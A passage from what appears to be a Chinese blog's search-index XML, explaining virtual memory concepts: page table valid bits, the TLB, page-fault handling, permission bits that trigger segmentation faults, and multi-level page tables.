如果地址为空，表示没有为虚拟页分配对应的物理页（1）。而有效标志位，用于表明是否缓存在DRAM中。如果有效位为1，则表示物理内存页已分配且已缓存（3），此时地址指向DRAM中物理内存页的地址。 如果有效位为0，则表示物理内存页已分配但缓存未命中（2）。<br><img src="https://gateway.pinata.cloud/ipfs/bafybeielcpwjaj3g7lywcwf4i7pc7g6uyimuzdaawuy235fc6rhfuwvryu" alt="3"><br>&emsp;&emsp;上述页表一般是缓存在L1 cache 中的，而MMU到 L1 cache 所需的指令周期也很长，所以MMU自己也做了一个小缓存，叫做翻译后备缓冲器TLB(（translation Lookaside buffer)<del>就是放一些比较常用的在身边方便找</del>。当MMU需要将虚拟内存地址转换为DRAM中的内存地址时，此时先查TLB，如果缓存命中直接就得到了DRAM中的地址，否则就需要到页表中去查。</p><h2 id="缺页异常"><a href="#缺页异常" class="headerlink" title="缺页异常"></a>缺页异常</h2><p>&emsp;&emsp;MMU查询页表，发现该虚拟页在DRAN中没有缓存，此时会触发<strong>缺页异常</strong>。此时程序的控制权转移给一个缺页异常程序，它所作的事情，简单来说就是从DRAM里面挑出一个暂时不用的页，把它写入磁盘，同时把我们所需要的页从磁盘中复制到DRAM里面。<br>&emsp;&emsp;由于程序的局部性原理，<del>进程总是趋向于在一个较小的活动页面集合上工作，这个工作集合或者说常驻集合，在第一次访问的时候被 cache 到 DRAM 中之后，后续都会命中缓存</del>。说白了就是DRAM命中率很高，很少会触发缺页异常，所以不用担心程序的效率问题。<br><img src="https://gateway.pinata.cloud/ipfs/bafybeibvnlisqz64okn3qvkhqtjtgk52edzukla653c4yokhe3xel2ja7q" alt="4"></p><h3 id="页表（再提一嘴）"><a href="#页表（再提一嘴）" class="headerlink" title="页表（再提一嘴）"></a>页表（再提一嘴）</h3><p>&emsp;&emsp;前面说到不同进程之间的越级访问问题，那么页表是如何解决这个问题的呢？<br>&emsp;&emsp;比如下图图中页表添加了3个许可位。SUP表示进程是否必须运行在内核模式才能访问该页。SUP为1 的页在用户态是无法访问的。同时还有读权限和写权限。当某个指令进行越权访问时，CPU就会触发一个段错误。<br><img src="https://gateway.pinata.cloud/ipfs/bafybeiha5qosfz3lkwqw6bhdfdg22dqow6hkywlm6wp3o6y7ddmr24z4z4" alt="5"><br>一般来说，页表可以实现以下的功能：<br>1.每个进程的代码段所在页是不可修改的<br>2.内核的代码和数据结构所在页也是不可修改的<br>3.进程不能读写其他进程的私有内存页<br>4.进程间通信可以通过设置进程间共享页来实现。即允许多个进程对某一页进行读写。</p><h2 id="多级页表-（进一步优化）"><a href="#多级页表-（进一步优化）" class="headerlink" title="多级页表 （进一步优化）"></a>多级页表 （进一步优化）</h2><p>&emsp;&emsp;我们做个计算，页表有多大，一页4KB，虚拟内存空间是4GB，<del>也就是有4GB&#x2F;4KB &#x3D; 10^6 个页，假设一个 PTE 大小是4个字节，页表的大小也达到了 4GB&#x2F;4KB* 4Byte &#x3D; 4MB</del>。由于页表是缓存在 L1 里的，4MB可不是个小数目。而且如果是64 位系统，虚拟内存空间是128 TB ，页表的大小将指数增长。<br>&emsp;&emsp;为了节省内存空间，页表可以采用多级结构。多级页表将整个虚拟地址空间划分为多个层级，每个层级都有自己的页表。通过多级页表，可以减少页表的大小，提高内存利用率。</p><hr><h3 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h3><p><em>大概先这些，后续有补充再更新</em><br><em>图源自网络，如侵删</em></p>]]></content>
      
      
      
        <tags>
            
            <tag> 虚拟内存 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
